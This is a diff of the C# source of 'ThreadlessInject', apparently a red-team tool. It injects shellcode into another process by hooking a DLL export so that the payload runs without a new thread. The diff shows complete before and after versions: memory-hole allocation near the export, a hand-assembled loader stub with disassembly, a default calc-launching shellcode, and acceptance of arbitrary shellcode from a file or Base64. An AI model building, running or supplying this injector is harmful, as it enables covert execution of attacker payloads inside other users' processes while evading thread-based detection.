@@ -1,307 +1,360 @@
-﻿using Mono.Options;
-using System;
-using System.IO;
-using System.Runtime.InteropServices;
-using System.Linq;
+﻿using System;
 using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
 using System.Threading;
 
-namespace ThreadlessInject {
-    class Program {
+using Mono.Options;
 
-        [Flags]
-        enum ProcessAccessFlags : uint {
-            All = 0x001F0FFF,
-            Terminate = 0x00000001,
-            CreateThread = 0x00000002,
-            VirtualMemoryOperation = 0x00000008,
-            VirtualMemoryRead = 0x00000010,
-            VirtualMemoryWrite = 0x00000020,
-            DuplicateHandle = 0x00000040,
-            CreateProcess = 0x000000080,
-            SetQuota = 0x00000100,
-            SetInformation = 0x00000200,
-            QueryInformation = 0x00000400,
-            QueryLimitedInformation = 0x00001000,
-            Synchronize = 0x00100000
-        }
+namespace ThreadlessInject;
 
-        [Flags]
-        public enum AllocationType {
-            Commit = 0x1000,
-            Reserve = 0x2000,
-            Decommit = 0x4000,
-            Release = 0x8000,
-            Reset = 0x80000,
-            Physical = 0x400000,
-            TopDown = 0x100000,
-            WriteWatch = 0x200000,
-            LargePages = 0x20000000
-        }
+using static Native;
+using static Win32;
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, uint processId);
+internal static class Program
+{
+    //x64 calc shellcode function with ret as default if no shellcode supplied
+    private static readonly byte[] CalcX64 =
+    {
+        0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
+        0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
+        0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
+        0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
+        0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
+        0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
+        0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
+        0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
+        0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
+    };
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool CloseHandle(IntPtr hObj);
+    private static readonly byte[] ShellcodeLoader =
+    {
+        0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
+        0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
+        0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
+        0xE0, 0x90
+    };
+    
+    private static IntPtr GetModuleHandle(string dll)
+    {
+        using var self = Process.GetCurrentProcess();
         
-        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        foreach (ProcessModule module in self.Modules)
+        {
+            if (!module.ModuleName.Equals(dll, StringComparison.OrdinalIgnoreCase))
+                continue;
 
-        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-        static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
+            return module.BaseAddress;
+        }
+        
+        return IntPtr.Zero;
+    }
 
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);
+    private static void GenerateHook(long originalInstructions)
+    {
+        // This function generates the following shellcode.
+        // The hooked function export is determined by immediately popping the return address and subtracting by 5 (size of relative call instruction)
+        // Original function arguments are pushed onto the stack to restore after the injected shellcode is executed
+        // The hooked function bytes are restored to the original values (essentially a one time hook)
+        // A relative function call is made to the injected shellcode that will follow immediately after the stub
+        // Original function arguments are popped off the stack and restored to the correct registers
+        // A jmp back to the original unpatched export restoring program behavior as normal
+        // 
+        // This shellcode loader stub assumes that the injector has left the hooked function RWX to enable restoration,
+        // the injector can then monitor for when the restoration has occured to restore the memory back to RX
 
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress,int dwSize, AllocationType dwFreeType);
+        /*
+          start:
+            0:  58                      pop    rax
+            1:  48 83 e8 05             sub    rax,0x5
+            5:  50                      push   rax
+            6:  51                      push   rcx
+            7:  52                      push   rdx
+            8:  41 50                   push   r8
+            a:  41 51                   push   r9
+            c:  41 52                   push   r10
+            e:  41 53                   push   r11
+            10: 48 b9 88 77 66 55 44    movabs rcx,0x1122334455667788
+            17: 33 22 11
+            1a: 48 89 08                mov    QWORD PTR [rax],rcx
+            1d: 48 83 ec 40             sub    rsp,0x40
+            21: e8 11 00 00 00          call   shellcode
+            26: 48 83 c4 40             add    rsp,0x40
+            2a: 41 5b                   pop    r11
+            2c: 41 5a                   pop    r10
+            2e: 41 59                   pop    r9
+            30: 41 58                   pop    r8
+            32: 5a                      pop    rdx
+            33: 59                      pop    rcx
+            34: 58                      pop    rax
+            35: ff e0                   jmp    rax
+          shellcode:
+        */
 
-        [DllImport("kernel32.dll")]
-        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        using var writer = new BinaryWriter(new MemoryStream(ShellcodeLoader));
+        //Write the original 8 bytes that were in the original export prior to hooking
+        writer.Seek(0x12, SeekOrigin.Begin);
+        writer.Write(originalInstructions);
+        writer.Flush();
+    }
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+    private static ulong FindMemoryHole(IntPtr hProcess, ulong exportAddress, int size)
+    {
+        ulong remoteLoaderAddress;
+        var foundMemory = false;
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, out long bytes, int dwSize, out IntPtr lpNumberOfBytesRead);
+        for (remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
+             remoteLoaderAddress < exportAddress + 0x70000000;
+             remoteLoaderAddress += 0x10000)
+        {
+            var status = AllocateVirtualMemory(hProcess, remoteLoaderAddress, size);
+            if (status != NTSTATUS.Success)
+                continue;
 
-        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
-        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
-
-        //x64 calc shellcode function with ret as default if no shellcode supplied
-        static byte[] x64 = {  0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
-                            0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
-                            0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
-                            0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
-                            0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
-                            0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
-                            0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
-                            0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
-                            0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3};
-
-        static byte[] shellcodeLoader = new byte[] { 0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF, 0xE0, 0x90 };
-
-
-        static byte[] GenerateHook(long startAddress, long originalInstructions) {
-
-            // This function generates the following shellcode.
-            // The hooked function export is determined by immdetietly popping the return address and substracting by 5 (size of relative call instruction)
-            // Original function arguments are pushed onto the stack to restore after the injected shellcode is executed
-            // The hooked function bytes are restored to the original values (essentially a one time hook)
-            // A relative function call is made to the injected shellcode that will follow immediately after the stub
-            // Original function arguments are popped off the stack and restored to the correct registers
-            // A jmp back to the original unpatched export restoring program behavior as normal
-            // 
-            // This shellcode loader stub assumes that the injector has left the hooked function RWX to enable restoration,
-            // the injector can then monitor for when the restoration has occured to restore the memory back to RX
-
-
-            /*
-              start:
-                0:  58                      pop    rax
-                1:  48 83 e8 05             sub    rax,0x5
-                5:  50                      push   rax
-                6:  51                      push   rcx
-                7:  52                      push   rdx
-                8:  41 50                   push   r8
-                a:  41 51                   push   r9
-                c:  41 52                   push   r10
-                e:  41 53                   push   r11
-                10: 48 b9 88 77 66 55 44    movabs rcx,0x1122334455667788
-                17: 33 22 11
-                1a: 48 89 08                mov    QWORD PTR [rax],rcx
-                1d: 48 83 ec 40             sub    rsp,0x40
-                21: e8 11 00 00 00          call   shellcode
-                26: 48 83 c4 40             add    rsp,0x40
-                2a: 41 5b                   pop    r11
-                2c: 41 5a                   pop    r10
-                2e: 41 59                   pop    r9
-                30: 41 58                   pop    r8
-                32: 5a                      pop    rdx
-                33: 59                      pop    rcx
-                34: 58                      pop    rax
-                35: ff e0                   jmp    rax
-              shellcode:
-            */
-
-            using (var writer = new BinaryWriter(new MemoryStream(shellcodeLoader))) {
-                //Write the original 8 bytes that were in the orignal export prior to hooking
-                writer.Seek(0x12, SeekOrigin.Begin);
-                writer.Write(originalInstructions);
-                writer.Flush();
-            }
-
-            return shellcodeLoader;
+            foundMemory = true;
+            break;
         }
 
-        static ulong FindMemoryHole(IntPtr processHandle, ulong exportAddress, int size) {
+        return foundMemory ? remoteLoaderAddress : 0;
+    }
 
-            ulong remoteLoaderAddress = 0;
-            bool foundMemory = false;
-
-            for (remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000; remoteLoaderAddress < exportAddress + 0x70000000; remoteLoaderAddress += 0x10000) {
-                if (VirtualAllocEx(processHandle, (IntPtr)remoteLoaderAddress, (IntPtr)size, 0x3000 , 0x20) != IntPtr.Zero) {
-                    foundMemory = true;
-                    break;
-                }
-            }
-
-            if (foundMemory)
-                return remoteLoaderAddress;
-            else
-                return 0;
-
+    private static byte[] ReadPayload(string path)
+    {
+        if (File.Exists(path))
+        {
+            return File.ReadAllBytes(path);
         }
 
-        static byte[] ReadPayload(string payloadArg) {
-            if (File.Exists(payloadArg)) {
-                return File.ReadAllBytes(payloadArg);
-            } else {
-                Console.WriteLine($"[=] Shellcode argument doesn't appear to be a file, assuming Base64");
-                return Convert.FromBase64String(payloadArg);
-            }
+        Console.WriteLine("[=] Shellcode argument doesn't appear to be a file, assuming Base64");
+        return Convert.FromBase64String(path);
+    }
+
+    private static byte[] LoadShellcode(string path)
+    {
+        byte[] shellcode;
+
+        if (path == null)
+        {
+            Console.WriteLine("[=] No shellcode supplied, using calc shellcode");
+            shellcode = CalcX64;
+        }
+        else
+        {
+            shellcode = ReadPayload(path);
         }
 
-        static byte[] LoadShellcode(string shellcodeArg) {
+        return shellcode;
+    }
 
-            byte[] shellcode = null;
+    public static void Main(string[] args)
+    {
+        var showHelp = false;
+        string shellcodeStr = null;
+        string dll = null;
+        string export = null;
+        var pid = 0;
 
-            if (shellcodeArg == null) {
-                Console.WriteLine("[=] No shellcode supplied, using calc shellcode");
-                    shellcode = x64;
-            } else {
-                shellcode = ReadPayload(shellcodeArg);
+        var optionSet = new OptionSet()
+            .Add("h|help", "Display this help", v => showHelp = v != null)
+            .Add("x=|shellcode=", "Path/Base64 for x64 shellcode payload (default: calc launcher)",
+                v => shellcodeStr = v)
+            .Add<int>("p=|pid=", @"Target process ID to inject", v => pid = v)
+            .Add("d=|dll=", "The DLL that that contains the export to patch (must be KnownDll)", v => dll = v)
+            .Add("e=|export=", "The exported function that will be hijacked", v => export = v);
+
+        try
+        {
+            optionSet.Parse(args);
+
+            if (dll == null || pid == 0 || export == null)
+            {
+                Console.WriteLine("[!] pid, dll and export arguments are required");
+                showHelp = true;
             }
 
-            return shellcode;
-        }
-
-        static void Main(string[] args) {
-
-            bool showHelp = false;
-            string shellcodeStr = null;
-            string dll = null;
-            string export = null; 
-            int pid = 0;
-
-            OptionSet option_set = new OptionSet()
-                .Add("h|help", "Display this help", v => showHelp = v != null)
-                .Add("x=|shellcode=", "Path/Base64 for x64 shellcode payload (default: calc launcher)", v => shellcodeStr = v)
-                .Add<int>("p=|pid=", @"Target process ID to inject", v => pid = v)
-                .Add("d=|dll=", "The DLL that that contains the export to patch (must be KnownDll)", v => dll = v)
-                .Add("e=|export=", "The exported function that will be hijacked", v => export = v);
-
-            try {
-
-                option_set.Parse(args);
-
-                if(dll == null || pid == 0 || export == null) {
-                    Console.WriteLine("[!] pid, dll and export arguments are required");
-                    showHelp = true;
-                }
-
-                if (showHelp) {
-                    option_set.WriteOptionDescriptions(Console.Out);
-                    return;
-                }
-
-            } catch (Exception e) {
-                Console.WriteLine($"[!] Failed to parse arguments: {e.Message}");
-                option_set.WriteOptionDescriptions(Console.Out);
+            if (showHelp)
+            {
+                optionSet.WriteOptionDescriptions(Console.Out);
                 return;
             }
 
-            IntPtr hDLL = GetModuleHandle(dll);
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine($"[!] Failed to parse arguments: {e.Message}");
+            optionSet.WriteOptionDescriptions(Console.Out);
+            return;
+        }
 
-            if(hDLL == IntPtr.Zero) {
-                hDLL = LoadLibrary(dll);
-            }
+        var hModule = GetModuleHandle(dll);
 
-            if(hDLL == IntPtr.Zero) {
-                Console.WriteLine($"[!] Failed to open handle to DLL {dll}, is the KnownDll loaded?");
-                return;
-            }
+        if (hModule == IntPtr.Zero)
+            hModule = LoadLibrary(dll);
 
-            IntPtr exportAddress = GetProcAddress(hDLL, export);
+        if (hModule == IntPtr.Zero)
+        {
+            Console.WriteLine($"[!] Failed to open handle to DLL {dll}, is the KnownDll loaded?");
+            return;
+        }
 
-            if(exportAddress == IntPtr.Zero) {
-                Console.WriteLine($"[!] Failed to find export {export} in {dll}, are you sure it's correct?");
-                return;
-            }
+        var exportAddress = GetProcAddress(hModule, export);
+        if (exportAddress == IntPtr.Zero)
+        {
+            Console.WriteLine($"[!] Failed to find export {export} in {dll}, are you sure it's correct?");
+            return;
+        }
 
-            Console.WriteLine($"[=] Found {dll}!{export} @ 0x{exportAddress.ToInt64():x}");
+        Console.WriteLine($"[=] Found {dll}!{export} @ 0x{exportAddress.ToInt64():x}");
 
-            IntPtr processHandle = OpenProcess(ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite | ProcessAccessFlags.VirtualMemoryOperation, false, (uint)pid);
+        var status = OpenProcess(pid, out var hProcess);
+        if (status != 0 || hProcess == IntPtr.Zero)
+        {
+            Console.WriteLine($"[!] Failed to open PID {pid}: {status}.");
+            return;
+        }
 
-            if(processHandle == IntPtr.Zero) {
-                Console.WriteLine($"[!] Failed to open process with ID {pid}, error 0x{Marshal.GetLastWin32Error():x}");
-                return;            
-            }
+        Console.WriteLine($"[=] Opened process with id {pid}");
 
-            Console.WriteLine($"[=] Opened process with id {pid}");
+        var shellcode = LoadShellcode(shellcodeStr);
+        
+        var loaderAddress = FindMemoryHole(
+            hProcess,
+            (ulong)exportAddress,
+            ShellcodeLoader.Length + shellcode.Length);
 
-            var shellcode = LoadShellcode(shellcodeStr);
-            var loaderAddress = FindMemoryHole(processHandle, (ulong)exportAddress, shellcodeLoader.Length + shellcode.Length);
+        if (loaderAddress == 0)
+        {
+            Console.WriteLine("[!] Failed to find a memory hole with 2G of export address, bailing");
+            return;
+        }
 
+        Console.WriteLine($"[=] Allocated loader and shellcode at 0x{loaderAddress:x} within PID {pid}");
 
-            if(loaderAddress == 0) {
-                Console.WriteLine("[!] Failed to find a memory hole with 2G of export address, bailing");
-                return;
-            }
+        var originalBytes = Marshal.ReadInt64(exportAddress);
+        GenerateHook(originalBytes);
 
-            Console.WriteLine($"[=] Allocated loader and shellcode at 0x{loaderAddress:x} within process {pid}");
+        ProtectVirtualMemory(
+            hProcess,
+            exportAddress,
+            8,
+            MemoryProtection.ExecuteReadWrite,
+            out var oldProtect);
 
-            var originalBytes = Marshal.ReadInt64(exportAddress);
-            var loader = GenerateHook((long)loaderAddress, originalBytes);
+        var relativeLoaderAddress = (int)(loaderAddress - ((ulong)exportAddress + 5));
+        var callOpCode = new byte[] { 0xe8, 0, 0, 0, 0 };
 
-            VirtualProtectEx(processHandle, exportAddress, (UIntPtr)8, 0x40, out uint oldProtect);
+        using var ms = new MemoryStream(callOpCode);
+        using var br = new BinaryWriter(ms);
+        br.Seek(1, SeekOrigin.Begin);
+        br.Write(relativeLoaderAddress);
 
-            int relativeLoaderAddress = (int)(loaderAddress - ((ulong)exportAddress + 5));
-            byte[] callOpCode = new byte[]{ 0xe8, 0, 0, 0, 0};
+        status = WriteVirtualMemory(
+            hProcess,
+            exportAddress,
+            callOpCode,
+            out var bytesWritten);
 
-            using (var writer = new BinaryWriter(new MemoryStream(callOpCode))) {
-                writer.Seek(1, SeekOrigin.Begin);
-                writer.Write(relativeLoaderAddress);
-            }
+        if (status != NTSTATUS.Success || (int)bytesWritten != callOpCode.Length)
+        {
+            Console.WriteLine($"[!] Failed to write callOpCode: {status}");
+            return;
+        }
 
-            var payload = shellcodeLoader.Concat(shellcode).ToArray();
+        var payload = ShellcodeLoader.Concat(shellcode).ToArray();
+        //WriteProcessMemory(hProcess, (IntPtr)loaderAddress, payload, payload.Length, out _);
 
-            WriteProcessMemory(processHandle, exportAddress, callOpCode, callOpCode.Length, out IntPtr written);
-            WriteProcessMemory(processHandle, (IntPtr)loaderAddress, payload, payload.Length, out written);
+        status = ProtectVirtualMemory(
+            hProcess,
+            (IntPtr)loaderAddress,
+            (uint)payload.Length,
+            MemoryProtection.ReadWrite,
+            out oldProtect);
 
+        if (status != NTSTATUS.Success)
+        {
+            Console.WriteLine($"[!] Failed to unprotect 0x{loaderAddress:x}");
+            return;
+        }
 
-            var timer = new Stopwatch();
-            timer.Start();
-            bool executed = false;
+        status = WriteVirtualMemory(
+            hProcess,
+            (IntPtr)loaderAddress,
+            payload,
+            out bytesWritten);
+        
+        if (status != NTSTATUS.Success || (int)bytesWritten != payload.Length)
+        {
+            Console.WriteLine($"[!] Failed to write payload: {status}");
+            return;
+        }
+        
+        status = ProtectVirtualMemory(
+            hProcess,
+            (IntPtr)loaderAddress,
+            (uint)payload.Length,
+            oldProtect,
+            out _);
+        
+        if (status != NTSTATUS.Success)
+        {
+            Console.WriteLine($"[!] Failed to protect 0x{loaderAddress:x}");
+            return;
+        }
 
-            Console.WriteLine("[+] Shellcode injected, Waiting 60s for the hook to be called");
+        var timer = new Stopwatch();
+        timer.Start();
+        var executed = false;
 
+        Console.WriteLine("[+] Shellcode injected, Waiting 60s for the hook to be called");
 
-            while(timer.Elapsed.TotalSeconds < 60) {
-
-                ReadProcessMemory(processHandle, exportAddress, out long currentBytes, 8, out IntPtr bytesRead);
-
-                if(originalBytes == currentBytes) {                  
-                    executed = true;
-                    break;
-                }
-
-                Thread.Sleep(1000);
-            }
-
-            timer.Stop();
-
-            if (executed) {
-                VirtualProtectEx(processHandle, exportAddress, (UIntPtr)8, oldProtect, out oldProtect);
-                VirtualFreeEx(processHandle, (IntPtr)loaderAddress, 0, AllocationType.Release);
-                Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s, export restored");                
-            } else {
-                Console.WriteLine("[!] Shellcode did not trigger within 60s, it may still execute but we are not cleaing up");
-            }
+        while (timer.Elapsed.TotalSeconds < 60)
+        {
+            var bytesToRead = 8;
+            var buf = Marshal.AllocHGlobal(bytesToRead);
             
-            CloseHandle(processHandle);
+            ReadVirtualMemory(
+                hProcess,
+                exportAddress,
+                buf,
+                (uint)bytesToRead,
+                out var bytesRead);
+
+            var temp = new byte[bytesRead];
+            Marshal.Copy(buf, temp, 0, bytesToRead);
+            var currentBytes = BitConverter.ToInt64(temp, 0);
+
+            if (originalBytes == currentBytes)
+            {
+                executed = true;
+                break;
+            }
+
+            Thread.Sleep(1000);
         }
+
+        timer.Stop();
+
+        if (executed)
+        {
+            ProtectVirtualMemory(
+                hProcess,
+                exportAddress,
+                8,
+                oldProtect,
+                out _);
+
+            FreeVirtualMemory(
+                hProcess,
+                (IntPtr)loaderAddress);
+
+            Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s, export restored");
+        }
+        else
+        {
+            Console.WriteLine("[!] Shellcode did not trigger within 60s, it may still execute but we are not cleaning up");
+        }
+
+        CloseHandle(hProcess);
     }
 }
